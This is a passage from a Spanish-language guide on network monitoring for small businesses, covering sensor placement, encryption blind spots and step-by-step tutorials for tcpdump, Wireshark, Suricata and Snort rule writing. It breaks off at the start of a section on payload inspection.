Los tres enfoques son complementarios, no excluyentes. Una arquitectura madura los combina: NetFlow para la historia larga y barata, PCAP para la investigación forense detallada y NIDS para las alertas en tiempo real. La siguiente subsección explica dónde y cómo ubicar físicamente un sensor dedicado que implementará estos enfoques.

### Arquitectura del Sensor y Ubicación

Antes de decidir dónde ubicar un sensor, es importante entender que no todas las organizaciones necesitan implementar uno dedicado para comenzar a monitorear su red. Existen alternativas más básicas como consultar los _logs_ del router o firewall y realizar capturas puntuales con herramientas como tcpdump o Wireshark. Sin embargo, cuando se busca obtener visibilidad continua y automatizar la detección de actividades sospechosas, incorporar un sensor de red puede ser una buena opción.

Entender qué tipo de datos recolectar es solo la mitad del problema. La otra mitad es ubicar el sensor de tal forma que realmente _vea_ el tráfico que nos interesa. Un sensor mal ubicado puede estar funcionando perfectamente y aun así ser completamente ciego al ataque que está ocurriendo.

#### El problema fundamental: cómo funciona un switch

Un conmutador (_switch_) moderno, a diferencia de los hubs antiguos, es un dispositivo inteligente: envía cada paquete únicamente al puerto donde está conectado el destinatario correcto. Si enchufas tu servidor de monitoreo en un puerto libre del switch, **solo verá su propio tráfico**, no el de las otras computadoras de la red. Para que un sensor pueda analizar las comunicaciones de la organización, el switch debe enviarle activamente una copia del tráfico que le interesa.

#### Puerto espejo (SPAN / _Port Mirroring_)

La solución estándar en redes empresariales pequeñas es configurar un **puerto espejo** (_SPAN: Switched Port Analyzer_ o _Port Mirroring_) en el switch administrable. Esta función le ordena al switch que copie todo el tráfico que pasa por uno o varios puertos (o por una VLAN completa) y lo reenvíe simultáneamente hacia el puerto donde está conectado el sensor.

La configuración se realiza desde la interfaz de administración web o CLI del switch (cada fabricante tiene su propia sintaxis, pero el concepto es universal). No requiere comprar hardware adicional. La única limitación es que, en redes muy cargadas, el puerto espejo puede descartar algunas copias si la suma del tráfico a espejar supera el ancho de banda del puerto de destino.

> [!NOTE:Network TAP para entornos de mayor criticidad]
> En organizaciones que necesitan garantía de captura sin pérdida de paquetes, se instala un dispositivo físico llamado **TAP** (_Test Access Point_) que se intercala directamente en el cable entre dos dispositivos. A diferencia del SPAN, el TAP es completamente pasivo (no consume energía para su función de captura) y no puede descartarse paquetes por saturación. Es la solución estándar en entornos medianos y grandes, o en segmentos críticos.

Para consultar procedimientos reales sobre cómo implementar un sensor, configurar la captura de tráfico e infraestructura, existen **referencias oficiales**, se sugiere consultar:

- [Cisco — Management Configuration Guide](https://www.cisco.com/c/en/us/td/docs/switches/lan/c9000/mgmt/management-configuration-guide.pdf): Documentación técnica que explica cómo configurar un puerto espejo para enviar copias del tráfico de red hacia un equipo de monitoreo.
- [Suricata — Quickstart Guide](https://docs.suricata.io/en/latest/quickstart.html): Guía oficial para instalar Suricata en Ubuntu, configurar la interfaz de captura y comenzar a inspeccionar tráfico de red.

#### Las tres posiciones clave donde ubicar el sensor

No todos los puntos de la red tienen el mismo valor para el monitoreo. Para una empresa típica, existen tres posiciones prioritarias:

1. **Detrás del firewall perimetral (Norte-Sur filtrado):** Esta posición permite ver todo el tráfico que el cortafuegos _ya aprobó_ y dejó pasar hacia la red interna, y todo el tráfico interno que salió hacia Internet. Es el punto más valioso para detectar conexiones hacia servidores de comando y control (_infraestructura que los atacantes usan para comunicarse, gestionar y enviar instrucciones a dispositivos infectados con malware_), descargas de malware que el firewall no bloqueó, y exfiltración de datos.

2. **En la zona de servidores públicos (DMZ):** Si la empresa tiene servidores accesibles desde Internet (web, correo, VPN), un sensor en la DMZ permite detectar intentos de explotación directa, escaneos de puertos y ataques a servicios publicados, antes de que lleguen a la red interna.

3. **En el enlace entre VLANs internas (Este-Oeste crítico):** Esta posición detecta el movimiento lateral: un atacante que ya comprometió una estación de trabajo en la red de oficinas e intenta conectarse al servidor de archivos o de base de datos en otra VLAN. Sin visibilidad aquí, ese desplazamiento pasa completamente desapercibido.

> [!IMPORTANT:Monitoreo en entornos virtualizados]
> Si los servidores son máquinas virtuales corriendo sobre un mismo host físico (VMware, Proxmox, KVM), el tráfico entre ellas nunca toca el switch físico: circula internamente por el **switch virtual del hipervisor**. En ese caso, el puerto espejo debe configurarse en el switch virtual de la plataforma de virtualización, no en el switch físico. Este es un punto ciego muy frecuente en infraestructuras pequeñas que comenzaron a virtualizar sus servidores pero no actualizaron su arquitectura de monitoreo.

### Limitaciones y Visibilidad Parcial

Con el sensor correctamente ubicado, es tentador asumir que tenemos visibilidad completa sobre la red. No es así, y es fundamental comprenderlo antes de dimensionar las expectativas del equipo y de la dirección de la organización.

Hoy prácticamente toda la comunicación relevante viaja cifrada: la navegación web usa `HTTPS` con `TLS 1.3`, el acceso remoto usa `SSH`, las VPNs cifran todo el túnel, y la mayoría de las aplicaciones modernas cifran sus APIs por defecto. Esto significa que en Wireshark o Suricata **no es posible leer el contenido interno de esas conversaciones ni ver los archivos transferidos**.

Intentar descifrar el tráfico en tránsito mediante técnicas específicas (como _SSL inspection_ o _TLS intercept_) es técnicamente posible pero introduce complejidad significativa: suele romper aplicaciones que usan _certificate pinning_, requiere instalar certificados raíz en todos los equipos de la organización, crea un nuevo punto de fallo crítico, y plantea implicaciones legales y de privacidad que deben evaluarse cuidadosamente. En la mayoría de las pequeñas empresas, el costo operativo supera el beneficio.

Aunque el contenido viaje cifrado, el _sobre_ siempre está a la vista. Con Zeek y los flujos de red seguimos teniendo acceso a información de alto valor analítico:

- **Direcciones IP** de origen y destino, y su geolocalización aproximada.
- **Puertos y protocolos** utilizados, que revelan el tipo de servicio utilizado, aunque no el contenido.
- **Volumen de datos transferidos** y la dirección del flujo (cuánto salió vs. cuánto entró).
- **Frecuencia y periodicidad de las conexiones** (por ejemplo, un equipo infectado que se reporta a su servidor de comando y control exactamente cada 60 segundos es detectable aunque el contenido esté cifrado).
- **Consultas DNS previas** al establecimiento de cada conexión cifrada.
- **Metadatos del saludo TLS** (_TLS handshake_): el nombre del servidor solicitado (_Server Name Indication_, SNI), la versión de TLS, la suite de cifrado y las huellas digitales de la negociación (`JA3` para el cliente, `JA3S` para el servidor, y el estándar más reciente `JA4`), que permiten identificar familias de malware aunque todo el canal esté cifrado.

#### Otros puntos ciegos a tener en cuenta

Más allá del cifrado, existen situaciones donde el sensor no capturará tráfico relevante aunque esté bien ubicado:

- **Tráfico WiFi entre dispositivos del mismo segmento:** Dos computadoras conectadas al mismo punto de acceso inalámbrico (WAP) que se comunican directamente pueden no pasar por el puerto espejo del switch, dependiendo de cómo esté configurada la red inalámbrica.
- **Exfiltración hacia servicios legítimos en la nube:** Si un atacante sube la información robada a Google Drive, OneDrive o Dropbox, el tráfico hacia esas plataformas parece indistinguible del uso legítimo desde la perspectiva del monitoreo de red.
- **Saturación del sensor en horas pico:** Un servidor sensor con recursos insuficientes (poca RAM o CPU) descartará paquetes durante los momentos de mayor carga de red, creando ventanas ciegas precisamente cuando la red está más activa.
- **Ataques completamente locales:** Si el atacante ya tiene acceso físico a un equipo de la red o explota una vulnerabilidad que no genera tráfico de red externo, el monitoreo perimetral no lo detectará.

Por estas razones, el monitoreo de red debe acompañarse siempre con la visibilidad dentro de los propios endpoints que se trata en la sección `05.3`.

Con los fundamentos conceptuales, la arquitectura del sensor y sus limitaciones claras, el siguiente paso es tomar decisiones prácticas sobre qué implementar primero.

#### Cómo se complementan las cinco herramientas

Las cinco herramientas que se detallan en las subsecciones siguientes ocupan un rol distinto en la arquitectura de monitoreo:

1. **`tcpdump`** es la herramienta de captura de emergencia: siempre disponible en cualquier servidor Linux, sin instalación adicional. Permite obtener rápidamente una muestra de tráfico (pcap) ante una sospecha concreta.
2. **Wireshark** es la lupa de análisis: toma el archivo `.pcap` generado por `tcpdump` u otra fuente y permite examinar cada paquete visualmente, reconstruir conversaciones (como el _Three-Way Handshake_) y verificar protocolos.
3. **Suricata** es la alarma continua (IDS/IPS): corre en segundo plano las 24 horas comparando cada paquete contra miles de firmas de ataques conocidos y genera alertas inmediatas.
4. **Snort** es el referente académico e histórico del formato de reglas: comprender su sintaxis permite leer y adaptar cualquier regla IDS del mercado, y validarla contra capturas sin necesidad de un entorno de producción. (_Las reglas IDS son condiciones predefinidas que utiliza un Sistema de Detección de Intrusos para analizar el tráfico de red. Funciona como un "patrón de búsqueda": si un paquete de datos coincide exactamente con los criterios de la regla, el sistema salta y genera una alerta de seguridad_)
5. **Zeek** es el libro de actas: en lugar de buscar ataques específicos, registra silenciosamente un historial organizado de todas las conexiones, consultas DNS y transferencias de archivos, permitiendo investigar qué ocurrió días o semanas atrás.

#### Hoja de ruta práctica: escalonamiento para una PyME

No intentes implementar todo de una vez. Avanza paso a paso según la capacidad real del equipo:

| Etapa                                    | Objetivo concreto                                                                  | Qué implementar en la práctica                                                                                                                                                                                                             |
| :--------------------------------------- | :--------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Nivel 1 — Base Esencial (IG1)**        | Conocer la red y poder investigar cuando algo anda mal.                            | Revisar los registros de bloqueos del firewall actual; documentar qué servicios son normales en la empresa; instalar `tcpdump` y **Wireshark** en el equipo de soporte para inspeccionar capturas ante sospechas puntuales.                |
| **Nivel 2 — Visibilidad Continua (IG2)** | Tener historial de conexiones y alertas automáticas sin arriesgar las operaciones. | Configurar un puerto espejo (SPAN) en el switch principal apuntando a un servidor Linux modesto donde corran **Zeek** (historial de conexiones y DNS) y **Suricata en modo pasivo (IDS)** con reglas actualizadas.                         |
| **Nivel 3 — Prevención Activa (IG3)**    | Bloquear ataques en tránsito automáticamente.                                      | Una vez conocidas bien las alertas de la red y eliminados los falsos positivos, convertir reglas específicas de alta confianza a modo de bloqueo en línea (**IPS** con Suricata) e implementar autenticación por puerto en los _switches_. |

La sección `Guía de implementación` ofrece una guía de selección detallada que ayuda a determinar exactamente qué herramienta o combinación de herramientas corresponde a cada situación concreta.

### La herramienta base para la captura de tcpdump

Cuando un incidente ocurre en un servidor remoto accesible exclusivamente por terminal, o cuando un equipo técnico necesita comprobar de inmediato si un puerto específico está recibiendo tráfico sin alterar el sistema, la primera herramienta de la línea de defensa es **`tcpdump`**.

`tcpdump` es el analizador y capturador de paquetes de línea de comandos estándar de los sistemas tipo Unix y Linux. Basado en la biblioteca central `libpcap`, permite interceptar, filtrar y mostrar en tiempo real las cabeceras y contenidos de los paquetes que atraviesan cualquier tarjeta de red. No requiere interfaz gráfica, consume recursos mínimos de procesador y memoria, y se encuentra disponible de forma nativa en casi cualquier distribución Linux empresarial.

#### ¿Cuándo conviene utilizar `tcpdump`?

- **Servidores sin interfaz gráfica (_headless_):** Permite verificar en vivo la conectividad y el tráfico de red directamente en servidores de producción o contenedores sin instalar escritorios gráficos ni herramientas pesadas.
- **Triage de emergencia:** Ante la sospecha de una exfiltración activa de datos, una conexión de comando y control (C2) o un escaneo de puertos, `tcpdump` permite confirmar en pocos segundos si el tráfico anómalo está circulando por la interfaz.
- **Generación de capturas forenses (`.pcap`):** Funciona como la fuente de extracción: captura los paquetes con fidelidad absoluta a nivel de bit y los guarda en disco para que luego puedan analizarse visualmente en Wireshark o procesarse con Zeek.
- **Filtrado previo para ahorro de espacio:** A diferencia de una captura ciega, `tcpdump` utiliza expresiones BPF (_Berkeley Packet Filters_) para descartar en memoria el tráfico irrelevante antes de escribirlo a disco.

#### Parámetros esenciales y sintaxis de filtros BPF

Dominar `tcpdump` requiere conocer sus banderas de control más importantes:

| Parámetro           | Significado y efecto operativo                                                                                                                                                                                                                                                                        |
| :------------------ | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-i <interfaz>`     | Especifica la tarjeta de red a escuchar (por ejemplo, `-i eth0` o `-i enp1s0`). Si se indica `-i any`, captura en todas las interfaces activas a la vez.                                                                                                                                              |
| `-nn`               | **Crítico:** Deshabilita la resolución de nombres DNS (primer `n`) y la traducción de números de puerto a nombres de servicios (segundo `n`). Muestra `192.168.1.10.443` en vez de `servidor.local.https`. Evita demoras en la terminal y previene que el propio sensor genere tráfico DNS adicional. |
| `-s 0`              | Configura la longitud de captura (_snaplen_) a 0 (paquete completo sin truncar, equivalente a `-s 65535`). Garantiza que se guarde todo el contenido y no solo los primeros bytes.                                                                                                                    |
| `-w <archivo.pcap>` | En lugar de imprimir el texto en pantalla, escribe los paquetes crudos directamente en un archivo con formato estándar PCAP.                                                                                                                                                                          |
| `-r <archivo.pcap>` | Modo lectura: procesa y muestra en la terminal los paquetes de un archivo PCAP previamente grabado.                                                                                                                                                                                                   |
| `-c <número>`       | Limita la captura a una cantidad exacta de paquetes y se detiene automáticamente (por ejemplo, `-c 100`).                                                                                                                                                                                             |
| `-X` / `-XX`        | Imprime las cabeceras y el cuerpo del paquete simultáneamente en formato hexadecimal y texto legible ASCII. Útil para inspeccionar tráfico web no cifrado o protocolos legacy.                                                                                                                        |
| `-v` / `-vv`        | Aumenta el nivel de detalle técnico mostrado (TTL, identificación de fragmentación, opciones IP y TCP).                                                                                                                                                                                               |

Las **expresiones BPF** se agregan al final del comando entre comillas. Permiten combinar primitivas como `host`, `net`, `port`, `src`, `dst` mediante operadores lógicos (`and`, `or`, `not`):

```bash:terminal
# Ejemplo de BPF: capturar tráfico web sin cifrar que no provenga de la red de administración
sudo tcpdump -i eth0 -nn "port 80 and not src net 192.168.10.0/24"
```

> [!CAUTION:Evita el bucle infinito al capturar por SSH]
> Si estás conectado a un servidor remoto mediante una sesión SSH en el puerto `22` y ejecutas `sudo tcpdump -i eth0` sin filtros, cada línea que `tcpdump` imprima en tu pantalla generará un nuevo paquete SSH saliente, el cual será capturado por `tcpdump`, imprimiendo otra línea y saturando tu conexión en un ciclo interminable. Utiliza **siempre** la exclusión del puerto de tu sesión:
> `sudo tcpdump -i eth0 -nn "not port 22"`

#### Tutorial paso a paso: Captura y análisis con `tcpdump`

:::steps

### 1. Identificar las interfaces de red disponibles

Antes de capturar, verifica los nombres exactos asignados por el sistema operativo a cada tarjeta de red:

```bash:terminal
sudo tcpdump -D
```

Resultado esperado: una lista numerada de interfaces activas (como `1.eth0 [Up, Running]`, `2.lo [Loopback]`, etc.). Localiza el identificador de la interfaz conectada a la red a investigar.

### 2. Captura quirúrgica hacia un archivo PCAP

Inicia una captura orientada a un puerto (por ejemplo, tráfico DNS en el puerto `53` o tráfico HTTPS en el `443`), guardando los paquetes completos en un archivo temporal:

```bash:terminal
sudo tcpdump -i eth0 -nn -s 0 "port 53 or port 443" -w /tmp/captura_prueba.pcap
```

Deja correr la captura durante el tiempo necesario. Para detenerla de forma limpia, presiona `Ctrl + C`. tcpdump mostrará en pantalla cuántos paquetes fueron capturados y cuántos fueron descartados por el kernel.

### 3. Inspeccionar el contenido de paquetes en vivo con ASCII

Si necesitas verificar si una aplicación interna está transmitiendo credenciales o datos sensibles en texto plano sin cifrar sobre el puerto `8080`, ejecuta:

```bash:terminal
sudo tcpdump -i eth0 -nn -s 0 -X -c 5 "tcp port 8080"
```

En la salida verás cada paquete desglosado: a la izquierda los valores hexadecimales y a la derecha los caracteres legibles, permitiendo detectar solicitudes `POST`, cabeceras `Authorization` o parámetros de autenticación sin cifrar.

### 4. Filtrar una captura existente desde la terminal

Puedes reutilizar las expresiones BPF para inspeccionar archivos `.pcap` ya guardados sin necesidad de copiarlos a otra computadora:

```bash:terminal
tcpdump -nn -r /tmp/captura_ejemplo.pcap "tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0"
```

Este comando procesa el archivo offline y muestra únicamente los paquetes TCP SYN de apertura de conexión, lo que permite auditar rápidamente qué destinos externos intentaron ser contactados.
:::

#### Seguridad en el manejo de archivos PCAP

Un archivo `.pcap` es un registro fiel de la actividad real de la empresa y puede contener correos electrónicos, peticiones HTTP con datos personales o secretos comerciales si viajaron sin cifrar. Aplica siempre dos reglas de higiene:

1. **Permisos restrictivos:** Ajusta los permisos del archivo inmediatamente después de crearlo para que solo el usuario `root` o el analista autorizado pueda leerlo (`sudo chmod 600 /tmp/*.pcap`).
2. **Transferencia cifrada y eliminación:** Transfiere las capturas a la estación de análisis utilizando canales protegidos (`scp` o `sftp`) y elimina los archivos temporales del servidor intervenido una vez concluida la recolección (`rm -f /tmp/*.pcap`).

### 5.2.1. Wireshark <!-- id: herramienta-wireshark, icon: EyeIcon, displayTitle: 05.2.7 — Wireshark, description: Inspección y análisis visual de paquetes, filtros de visualización, reconstrucción de flujos TCP y análisis de protocolos. -->

Cuando necesitamos investigar en profundidad qué ocurrió durante una conexión sospechosa, leer miles de líneas de texto crudo en la consola resulta agotador y poco práctico. [**Wireshark**](https://www.wireshark.org) es un analizador de protocolos gratuito y de código abierto con interfaz gráfica que toma cualquier archivo de captura `.pcap` (o escucha la red en vivo) y lo traduce en una vista ordenada, permitiéndonos explorar cada capa del paquete y reconstruir conversaciones completas.

#### ¿Cuándo conviene utilizar Wireshark?

- **Análisis forense de incidentes:** Tras recibir una alerta de IDS o detectar una anomalía con Zeek, el archivo `.pcap` asociado se puede abrir en Wireshark para examinar los paquetes exactos que dispararon el incidente.
- **Diagnóstico y verificación de protocolos:** Comprobar si los equipos están aplicando cifrado TLS de forma correcta, validar configuraciones de DNS o resolver fallos de comunicación en servicios internos.
- **Auditoría de aplicaciones sin cifrar:** Demostrar el riesgo operativo al exponer contraseñas o tokens en claro dentro de la red corporativa.

### Instalación rápida de Wireshark

En la estación de trabajo del analista de seguridad o administrador de TI:

- **En distribuciones Ubuntu/Debian:** Descargando el instalador oficial desde su web o mediante la terminal:

```bash:terminal
sudo apt update && sudo apt install -y wireshark
# Permitir capturar paquetes a usuarios no-root y agregar tu usuario al grupo:
sudo usermod -aG wireshark $USER
# Cierra la sesión y vuelve a iniciarla para que el cambio de grupo tenga efecto
```

- **En macOS:** Descargando el instalador oficial desde su web o mediante Homebrew con el comando `brew install --cask wireshark`.
- **En Microsoft Windows:** Descargando el instalador oficial desde el sitio web del proyecto, asegurándose de incluir el controlador de captura **Npcap**.

[Wireshark](https://www.wireshark.org/#download 'Sitio de descarga oficial')

#### Paso a paso: Cómo usar Wireshark desde cero

En la siguiente imagen podemos ver cómo es la interfaz básica de la aplicación; Debajo, se detalla cómo utilizarla para analizar el tráfico de red.

<DocsImage
  src="https://www.wireshark.org/docs/wsug_html_chunked/images/ws-main.png"
  alt="Interfaz principal de Wireshark con sus tres paneles: lista de paquetes, detalles del protocolo y volcado en bytes"
  caption="Ventana principal de Wireshark mostrando la captura de paquetes dividida en tres paneles sincronizados: Packet List, Packet Details y Packet Bytes."
/>

:::steps

### 1. Abrir una captura de tráfico

Si ya capturaste un archivo con `tcpdump` en un servidor y lo copiaste a tu computadora de trabajo, puedes abrirlo directamente desde el menú **File → Open** de la aplicación o lanzándolo desde tu terminal: `wireshark /tmp/captura.pcap`.

Al abrirse, verás la pantalla dividida en tres paneles horizontales que trabajan conectados entre sí:

- **Panel superior — Lista de paquetes (_Packet List_):** Muestra una tabla donde cada fila es un paquete numerado (`No.`), indicando el segundo exacto en que ocurrió (`Time`), quién lo envió (`Source`), quién lo recibió (`Destination`), el protocolo (`Protocol`), el tamaño (`Length`) y un resumen de lo que hace (`Info`).
- **Panel central — Detalles del paquete (_Packet Details_):** Al hacer clic sobre cualquier fila del panel superior, aquí verás el paquete desarmado capa por capa (direcciones físicas MAC en Ethernet, direcciones IP en IPv4, puertos y banderas en TCP, y datos de aplicación como DNS o HTTP). Puedes desplegar cada signo `+` o flecha para leer sus campos individuales.
- **Panel inferior — Bytes del paquete (_Packet Bytes_):** Muestra los datos crudos tal como viajaron por el cable, tanto en formato hexadecimal como en texto legible (ASCII) a la derecha.

### 2. Aplicar filtros de visualización para limpiar el ruido

Una captura de pocos minutos puede tener decenas de miles de paquetes. Para encontrar lo que buscas sin perder horas desplazando la pantalla, utiliza la **barra de filtros de visualización (_Display Filters_)** ubicada en la parte superior de la ventana. Escribe la condición y presiona `Enter`. El siguiente filtro ocultará temporalmente todo el resto del tráfico y dejará en pantalla únicamente los paquetes donde participe el equipo `192.168.1.10` (sin borrar nada del archivo original):

```text:wireshark
ip.addr == 192.168.1.10
```

### 3. Verificar cómo se establecen las conexiones (Saludo de tres vías TCP)

Para saber si un intento de conexión hacia un puerto tuvo éxito o fue rechazado por un cortafuegos, observa la columna `Info` en los paquetes TCP. Una conexión exitosa siempre inicia con tres paquetes consecutivos (_Three-Way Handshake_):

- **`[SYN]`:** El equipo origen pide abrir comunicación.
- **`[SYN, ACK]`:** El servidor destino responde que el puerto está abierto y acepta.
- **`[ACK]`:** El origen confirma y comienza a enviar datos.

Si en lugar de eso observas cientos de paquetes `[SYN]` enviados desde una misma computadora hacia distintos puertos seguidos de respuestas `[RST, ACK]` (Reinicio), estás viendo en pantalla la evidencia clara de un escaneo de puertos.

### 4. Reconstruir el contenido de una conversación (Follow Stream)

Si encuentras una comunicación en texto claro (como tráfico HTTP no cifrado o un protocolo interno) y quieres leer todo el diálogo de corrido sin ir paquete por paquete, haz **clic derecho** sobre cualquiera de los paquetes de esa sesión y selecciona **Follow → TCP Stream**. Wireshark abrirá una ventana emergente mostrando en un color lo que pidió el cliente y en otro color todo lo que respondió el servidor.
:::

| Filtro de visualización en Wireshark        | ¿Qué muestra exactamente en pantalla?                                                                                                   |
| :------------------------------------------ | :-------------------------------------------------------------------------------------------------------------------------------------- |
| `ip.addr == 192.168.1.10`                   | Todos los paquetes donde esa dirección IP sea origen o destino.                                                                         |
| `ip.src == 192.168.1.10`                    | Únicamente los paquetes enviados desde esa dirección IP.                                                                                |
| `ip.dst == 192.168.1.10`                    | Únicamente los paquetes recibidos por esa dirección IP.                                                                                 |
| `dns`                                       | Todas las consultas y respuestas de nombres de dominio.                                                                                 |
| `http`                                      | Tráfico web sin cifrar.                                                                                                                 |
| `tcp.port == 443`                           | Comunicaciones TCP que utilicen el puerto 443.                                                                                          |
| `tcp.flags.syn == 1 and tcp.flags.ack == 0` | Solo los paquetes iniciales de solicitud de conexión TCP (ideal para buscar escaneos).                                                  |
| `tls.handshake.type == 1`                   | Solicitudes iniciales de conexión TLS (_Client Hello_), donde se puede inspeccionar el campo SNI con el nombre del servidor solicitado. |

> [!NOTE:Diferencia entre Filtro de Captura y Filtro de Visualización]
> No confundas ambos conceptos: un **Filtro de Captura** (como `port 443` en `tcpdump` o en la pantalla de inicio de Wireshark) decide qué paquetes se guardan en el disco mientras se graba y descarta el resto para siempre. Un **Filtro de Visualización** en Wireshark (`tcp.port == 443`) solo filtra la vista en tu monitor sobre un archivo ya guardado; al borrar el texto de la barra, todos los paquetes vuelven a aparecer.

#### Aplicación práctica en una PyME

Wireshark no es un programa para dejar corriendo en segundo plano esperando ataques, sino la herramienta de diagnóstico cuando ya tienes una duda concreta. Úsala en tu organización cuando un servidor presente tráfico inusual, cuando necesites comprobar si una aplicación interna antigua está enviando contraseñas sin cifrar por la red local, o para analizar el archivo `.pcap` de un incidente puntual. Recuerda almacenar los archivos `.pcap` en carpetas seguras, ya que contienen datos reales de la red.

### 5.2.2. Suricata <!-- id: herramienta-suricata, icon: ShieldAlertIcon, displayTitle: 05.2.8 — Suricata, description: Detección y prevención continua de intrusiones (NIDS/NIPS), motor multihilo, gestión de reglas y análisis de alertas en eve.json. -->

Mientras que Wireshark requiere que una persona mire la pantalla paquete por paquete, [**Suricata**](https://suricata.io) automatiza la vigilancia las 24 horas del día. Es un motor gratuito y de código abierto capaz de funcionar simultáneamente como detector de intrusiones pasivo (IDS), sistema de prevención en línea (IPS) y generador de registros de seguridad de red (NSM), aprovechando múltiples núcleos del procesador gracias a su arquitectura multihilo.

Su lógica se basa en comparar cada paquete que circula por la red contra una lista de miles de **reglas o firmas de detección** actualizadas por la comunidad (como el catálogo libre _Emerging Threats Open_). Cuando detecta una comunicación que coincide con el patrón de un ataque o malware conocido, registra una alerta detallada al instante.

#### Tutorial desde cero: Instalación y puesta en marcha en modo IDS (Ubuntu)

Para una pequeña empresa, se sugiere comenzar implementando Suricata en **modo pasivo (IDS)**. De este modo, el motor observa el tráfico y genera alertas sin riesgo de bloquear por error las operaciones diarias del negocio.

:::steps

### 1. Instalar Suricata y la utilidad de lectura JSON

En un servidor Ubuntu destinado a funcionar como sensor, agrega el repositorio oficial estable del proyecto e instala tanto el motor como la herramienta `jq` (que nos servirá para leer sus registros fácilmente en la terminal):

```bash:terminal
sudo apt-get update && sudo apt-get install -y software-properties-common
sudo add-apt-repository -y ppa:oisf/suricata-stable
sudo apt-get update && sudo apt-get install -y suricata jq
```

Verifica que el paquete se haya instalado correctamente consultando su versión:

```bash:terminal
sudo suricata --build-info
```

### 2. Identificar tu interfaz de red y configurar `suricata.yaml`

Consulta cómo se llama la tarjeta de red por la cual tu servidor recibirá el tráfico a monitorear con `ip -br addr`. Supongamos que tu interfaz se llama `enp1s0` y tu red local de la empresa utiliza el rango `192.168.1.0/24`. Abre el archivo de configuración principal ubicado en `/etc/suricata/suricata.yaml`. Allí debes asegurarte de ajustar dos elementos clave:

- En la variable `HOME_NET`, define los rangos IP de tu red interna para que Suricata distinga qué equipos son tuyos y cuáles son externos.
- En la sección de captura `af-packet`, coloca el nombre exacto de tu interfaz:

```yaml:/etc/suricata/suricata.yaml
vars:
  address-groups:
    HOME_NET: "[192.168.1.0/24,10.0.0.0/8]"
    EXTERNAL_NET: "!$HOME_NET"

af-packet:
  - interface: enp1s0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes
    tpacket-v3: yes
```

### 3. Descargar las reglas de detección y validar la configuración

Un motor recién instalado no tiene firmas de ataques cargadas. Ejecuta la herramienta integrada `suricata-update` para que descargue automáticamente el conjunto gratuito de reglas _Emerging Threats Open_:

```bash:terminal
sudo suricata-update
```

Antes de encender el servicio, comprueba siempre que no hayas cometido errores de tipeo en el archivo `.yaml` ejecutando la prueba de validación (`-T`):

```bash:terminal
sudo suricata -T -c /etc/suricata/suricata.yaml
```

Si las últimas líneas indican que la configuración es válida, reinicia el servicio y verifica que esté activo:

```bash:terminal
sudo systemctl restart suricata
sudo systemctl status suricata
```

### 4. Consultar las alertas en tiempo real

Suricata guarda sus hallazgos en el directorio `/var/log/suricata/`. Tienes dos formas prácticas de vigilar qué está detectando:

- **Lectura rápida en una línea (`fast.log`):** Ideal para ver alertas simples de texto a medida que ocurren:

```bash:terminal
sudo tail -f /var/log/suricata/fast.log
```

- **Lectura estructurada (`eve.json` con `jq`):** El archivo `eve.json` guarda toda la riqueza de datos en formato JSON. Puedes filtrar en vivo únicamente los eventos que sean alertas de seguridad ejecutando:

```bash:terminal
sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type == "alert")'
```

Allí verás con claridad la fecha y hora, la dirección IP atacante, la dirección IP víctima, el puerto y el nombre exacto de la regla que se disparó (`alert.signature`).
:::

#### Cómo aplicarlo en una pequeña empresa

En una pequeña organización, instala Suricata en un equipo modesto conectado a un puerto espejo (SPAN) de tu _switch_ principal (justo detrás del firewall de salida a Internet). Programa una tarea semanal o diaria para que `suricata-update` mantenga las firmas al día y revisa las alertas generadas. Recuerda que una alerta no siempre confirma que el ataque haya tenido éxito: te avisa que alguien lo intentó, permitiéndote verificar si el equipo destino está parcheado o si debes bloquear esa dirección IP en tu firewall.

[Suricata](https://suricata.io/download/ 'Sitio oficial de instalación')

### 5.2.3. Snort <!-- id: herramienta-snort, icon: Settings02Icon, displayTitle: 05.2.9 — Snort, description: Motor clásico de detección por firmas, formato universal de reglas IDS y validación contra archivos de captura con Snort 3. -->

**Snort** es el sistema de detección y prevención de intrusiones (IDS/IPS) de código abierto más conocido históricamente y el que definió el formato de reglas utilizado en la industria. Cumple exactamente el mismo rol arquitectónico que Suricata: inspeccionar los paquetes frente a una lista de reglas para alertar o bloquear amenazas.

> [!TIP:¿Debes instalar Suricata y Snort al mismo tiempo?]
> **No.** En una PyME no tiene sentido instalar ambos motores en el mismo servidor porque consumen recursos haciendo el mismo trabajo. En este módulo explicamos Suricata como motor principal por su facilidad de instalación mediante paquetes listos para usar y su rendimiento multihilo nativo. Sin embargo, conocer cómo se escribe una regla en **Snort 3** y cómo probarla contra un archivo `.pcap` te dará una habilidad fundamental que sirve para entender cualquier sistema IDS del mercado.

#### Tutorial desde cero: Cómo escribir una regla y probarla con Snort 3

A diferencia de Suricata, la instalación completa de Snort 3 en producción suele requerir compilar componentes desde el código fuente según su documentación oficial. Una forma muy práctica y segura de utilizarlo para aprender o analizar incidentes consiste en escribir nuestras propias reglas locales y pasarle un archivo `.pcap` ya capturado para ver qué detecta.

:::steps

### 1. Comprender la anatomía de una regla de detección

Toda regla en Snort o Suricata se divide en dos secciones principales:

- **Encabezado (_Header_):** Define la acción a tomar (`alert`, `drop`, etc.), el protocolo (`tcp`, `udp`, `icmp`), las direcciones IP y los puertos de origen y destino, junto con el operador de dirección (`->`).
- **Opciones (_Rule Options_):** Encerradas entre paréntesis y separadas por punto y coma `;`, detallan los metadatos y los patrones que activan la alerta.

Crea un archivo llamado `local.rules` con una regla básica de cabecera:

```text:local.rules
alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (
    msg:"Conexion TCP entrante hacia servicio HTTP puerto 80";
    sid:1000001;
    rev:1;
)
```

- `msg`: Texto descriptivo que aparecerá en el registro o pantalla cuando la regla coincida.
- `sid` (_Signature ID_): Identificador numérico único de la regla. Por convención, los identificadores menores a 1.000.000 están reservados para reglas oficiales de Snort y Suricata; las reglas locales o personalizadas deben usar números a partir de `1000001` para evitar colisiones.
- `rev`: Número de revisión (inicia en 1 y se incrementa cada vez que edites la regla).

### 2. Inspeccionar la carga útil (_payload_) y controlar el flujo TCP

Una regla basada únicamente en puertos dispararía una alerta con cada visita legítima a tu web. Para escribir reglas efectivas que detecten ataques reales sin generar falsos positivos, se inspecciona el contenido del paquete y el estado de la sesión:

```text:local.rules
